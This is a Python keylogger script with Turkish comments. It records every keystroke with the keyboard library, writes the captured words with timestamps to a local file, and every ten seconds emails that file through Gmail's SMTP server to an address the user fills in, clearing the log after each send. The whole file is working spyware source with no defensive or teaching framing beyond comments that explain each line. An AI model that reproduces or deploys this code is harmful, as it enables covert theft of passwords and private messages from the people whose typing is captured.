import keyboard
import datetime
import smtplib #E-posta göndermek için kullanılan Simple Mail Transfer Protocol (SMTP) kütüphanesidir.
from email.mime.text import MIMEText
import time

# https://www.youtube.com/watch?v=hXiPshHn9Pw bu video ile app password alabilirsiniz


word=""
interval=10 # interval adlı bir zaman aralığı belirlenir. her 10 saniyede bir

dosya=open("key_log.txt","w")

def on_press(key):
    global word
    if key.name in ["space","enter"] : #boşluğa veya enter tuşuna basılırsa o anki word değerini yazar
        with open("key_log.txt","a") as file :
            file.write(word+ ""+ "Girilme tarihi= "+ str(datetime.datetime.now())+ "\n")
        word=""
    elif key.name=="backspace" :
        word= word[:-1] # sondan siler
    else:
        word+= key.name

keyboard.on_press(on_press)

while True:
    with open("key_log.txt") as file:
        data=file.read()

    if data:
        msg=MIMEText(data) #MIMEText sınıfından "msg" adlı bir e-posta nesnesi oluşturulur.
        msg["Subject"] = "keyLogger Data"  # E-posta başlığı
        msg["From"] = "" # gmail gönderen adresi
        msg["To"] ="" # gmail alıcı adresi

 #E-postayı göndermek için "smtp.gmail.com" üzerinden 587 numaralı bağlantı noktasını kullanan bir SMTP nesnesi oluşturulur.
        mail=smtplib.SMTP("smtp.gmail.com", 587)
        mail.ehlo() # SMTP sunucusuyla etkileşime girer.
        mail.starttls() # SMTP sunucusu ile güvenli bir bağlantı (TLS/SSL) kurar.
        mail.login("", "") #(gönderen gmail, google üzerinden gmail içn adlığın şifre)
        mail.sendmail("gönderen gmail","alıcı gmail",msg.as_string())
        mail.close()  # SMTP bağlantısını kapatır.

# dosyanın içeriğini temizlemek için dosyayı yeniden açar ve içeriği boş bir şekilde yeniden yazar.
        with open("key_log.txt","w") as file :
            file.write("")
        time.sleep(interval) # Belirtilen aralık kadar bekleme yapar, sonra tekrar veri toplamaya ve e-posta göndermeye başlar.


